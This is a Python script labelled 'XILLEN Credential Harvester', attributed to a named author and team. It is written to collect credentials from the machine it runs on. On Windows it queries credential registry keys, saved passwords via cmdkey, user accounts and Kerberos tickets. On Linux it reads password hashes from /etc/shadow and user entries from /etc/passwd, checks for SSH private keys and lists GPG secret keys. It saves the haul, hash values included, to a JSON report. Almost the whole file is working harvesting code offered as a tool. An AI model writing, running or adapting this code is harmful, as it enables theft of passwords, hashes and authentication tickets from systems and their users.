#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import platform
import json
import hashlib
from pathlib import Path

class CredentialHarvester:
    def __init__(self):
        self.credentials = []
        self.hashes = []
        self.tokens = []
        
    def scan_windows_credentials(self):
        if platform.system() != "Windows":
            return
            
        self.scan_registry_credentials()
        self.scan_saved_passwords()
        self.scan_password_hashes()
        self.scan_kerberos_tickets()
        
    def scan_registry_credentials(self):
        registry_paths = [
            r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Credentials",
            r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
        ]
        
        for path in registry_paths:
            try:
                result = subprocess.run(["reg", "query", path], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0 and result.stdout.strip():
                    self.credentials.append({
                        "type": "Registry",
                        "source": path,
                        "data": result.stdout[:200]
                    })
            except Exception:
                pass
                
    def scan_saved_passwords(self):
        try:
            result = subprocess.run(["cmdkey", "/list"], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout.strip():
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'target' in line.lower():
                        self.credentials.append({
                            "type": "Saved Password",
                            "source": "Credential Manager",
                            "data": line.strip()
                        })
        except Exception:
            pass
            
    def scan_password_hashes(self):
        try:
            result = subprocess.run(["wmic", "useraccount", "get", "name,sid"], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines[1:]:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 2:
                            self.hashes.append({
                                "username": parts[0],
                                "sid": parts[1],
                                "type": "User Account"
                            })
        except Exception:
            pass
            
    def scan_kerberos_tickets(self):
        try:
            result = subprocess.run(["klist"], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout.strip():
                self.tokens.append({
                    "type": "Kerberos Ticket",
                    "source": "klist",
                    "data": result.stdout[:300]
                })
        except Exception:
            pass
            
    def scan_linux_credentials(self):
        if platform.system() == "Windows":
            return
            
        self.scan_shadow_file()
        self.scan_passwd_file()
        self.scan_ssh_keys()
        self.scan_gpg_keys()
        
    def scan_shadow_file(self):
        try:
            with open("/etc/shadow", "r") as f:
                lines = f.readlines()
                for line in lines:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        username = parts[0]
                        hash_value = parts[1]
                        if hash_value != "*" and hash_value != "!":
                            self.hashes.append({
                                "username": username,
                                "hash": hash_value,
                                "type": "Shadow Hash"
                            })
        except Exception:
            pass
            
    def scan_passwd_file(self):
        try:
            with open("/etc/passwd", "r") as f:
                lines = f.readlines()
                for line in lines:
                    parts = line.split(":")
                    if len(parts) >= 3:
                        username = parts[0]
                        uid = parts[2]
                        gid = parts[3]
                        if int(uid) >= 1000:
                            self.credentials.append({
                                "type": "User Account",
                                "username": username,
                                "uid": uid,
                                "gid": gid
                            })
        except Exception:
            pass
            
    def scan_ssh_keys(self):
        ssh_paths = [
            os.path.expanduser("~/.ssh/id_rsa"),
            os.path.expanduser("~/.ssh/id_dsa"),
            os.path.expanduser("~/.ssh/id_ecdsa")
        ]
        
        for key_path in ssh_paths:
            if os.path.exists(key_path):
                try:
                    with open(key_path, "r") as f:
                        content = f.read()
                        self.credentials.append({
                            "type": "SSH Private Key",
                            "path": key_path,
                            "size": len(content)
                        })
                except Exception:
                    pass
                    
    def scan_gpg_keys(self):
        try:
            result = subprocess.run(["gpg", "--list-secret-keys"], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout.strip():
                self.credentials.append({
                    "type": "GPG Private Key",
                    "source": "gpg",
                    "data": result.stdout[:200]
                })
        except Exception:
            pass
            
    def generate_report(self):
        print("\n===============================================")
        print("    Credential Harvesting Report")
        print("===============================================")
        
        print(f"Credentials found: {len(self.credentials)}")
        print(f"Password hashes: {len(self.hashes)}")
        print(f"Security tokens: {len(self.tokens)}")
        
        if self.credentials:
            print("\nCredentials:")
            for i, cred in enumerate(self.credentials, 1):
                print(f"{i}. {cred['type']}")
                if 'username' in cred:
                    print(f"   Username: {cred['username']}")
                if 'source' in cred:
                    print(f"   Source: {cred['source']}")
                if 'path' in cred:
                    print(f"   Path: {cred['path']}")
                print()
                
        if self.hashes:
            print("\nPassword Hashes:")
            for i, hash_data in enumerate(self.hashes, 1):
                print(f"{i}. {hash_data['type']}")
                if 'username' in hash_data:
                    print(f"   Username: {hash_data['username']}")
                if 'hash' in hash_data:
                    print(f"   Hash: {hash_data['hash'][:20]}...")
                print()
                
        self.save_report()
        
    def save_report(self):
        report_file = "credential_report.json"
        
        report_data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "author": "@Bengamin_Button",
            "team": "@XillenAdapter",
            "platform": platform.system(),
            "credentials": self.credentials,
            "hashes": self.hashes,
            "tokens": self.tokens,
            "summary": {
                "total_credentials": len(self.credentials),
                "total_hashes": len(self.hashes),
                "total_tokens": len(self.tokens)
            }
        }
        
        try:
            with open(report_file, 'w') as f:
                json.dump(report_data, f, indent=2)
            print(f"[+] Report saved to: {report_file}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")
            
    def run_harvest(self):
        print("===============================================")
        print("    XILLEN Credential Harvester")
        print("    Сбор учетных данных")
        print("===============================================")
        print("Author: @Bengamin_Button")
        print("Team: @XillenAdapter")
        print()
        
        if platform.system() == "Windows":
            self.scan_windows_credentials()
        else:
            self.scan_linux_credentials()
            
        print()
        self.generate_report()

def main():
    harvester = CredentialHarvester()
    harvester.run_harvest()

if __name__ == "__main__":
    main()
